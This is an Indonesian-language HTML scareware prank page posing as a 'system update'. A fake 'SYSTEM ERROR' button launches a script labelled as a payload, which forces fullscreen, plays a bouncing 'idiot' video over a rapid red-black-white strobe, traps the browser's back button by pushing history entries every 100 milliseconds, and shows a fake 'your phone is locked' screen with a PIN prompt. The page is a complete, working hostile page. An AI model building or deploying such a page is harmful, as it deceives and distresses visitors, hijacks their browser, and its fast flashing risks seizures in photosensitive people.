<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SISTEM UPDATE</title>
    <style>
        body { background: #000; color: #fff; margin: 0; overflow: hidden; font-family: sans-serif; height: 100vh; width: 100vw; display: flex; align-items: center; justify-content: center; }
        #setup { position: fixed; width: 100%; height: 100%; background: #111; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .btn-start { padding: 25px 40px; font-size: 20px; background: red; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 10px; }
        #chaos { display: none; position: fixed; width: 100%; height: 100%; z-index: 9998; }
        .glitch { animation: flash 0.05s infinite; }
        @keyframes flash { 0% { background: #f00; } 50% { background: #000; } 100% { background: #fff; } }
        video#idiotVid { width: 300px; position: absolute; }
    </style>
</head>
<body>

    <div id="setup">
        <h2>⚠️ SYSTEM ERROR ⚠️</h2>
        <button class="btn-start" onclick="startPayload()">PERBAIKI SEKARANG</button>
    </div>

    <div id="chaos" class="glitch">
        <video id="idiotVid" loop playsinline>
            <source src="idiot_video.mp4" type="video/mp4">
        </video>
        <div style="position:fixed; bottom:0; width:100%; background:rgba(0,0,0,0.8); padding:20px; color:lime;">
            <p>HP ANDA TERKUNCI! PIN: 201192777</p>
            <input type="number" id="pin" placeholder="PIN">
            <button onclick="checkPin()">UNLOCK</button>
        </div>
    </div>

    <script>
        function startPayload() {
            console.log("Payload started...");
            
            // 1. Tampilkan layar chaos
            document.getElementById('setup').style.display = 'none';
            document.getElementById('chaos').style.display = 'block';

            // 2. Putar Video
            const v = document.getElementById('idiotVid');
            v.play().catch(e => console.log("Video play failed:", e));

            // 3. Paksa Fullscreen
            const el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

            // 4. Jalankan Bouncing & Anti-Back
            runAnimations();
        }

        function runAnimations() {
            const v = document.getElementById('idiotVid');
            let x=0, y=0, dx=10, dy=10;
            setInterval(() => {
                if(x + v.offsetWidth > window.innerWidth || x < 0) dx = -dx;
                if(y + v.offsetHeight > window.innerHeight || y < 0) dy = -dy;
                x+=dx; y+=dy; v.style.left=x+'px'; v.style.top=y+'px';
            }, 30);

            // Anti-Back Hijack
            setInterval(() => { window.history.pushState(null, null, window.location.href); }, 100);
        }

        function checkPin() {
            if(document.getElementById('pin').value === "201192777") {
                location.reload();
            } else {
                alert("SALAH!");
            }
        }
    </script>
</body>
</html>
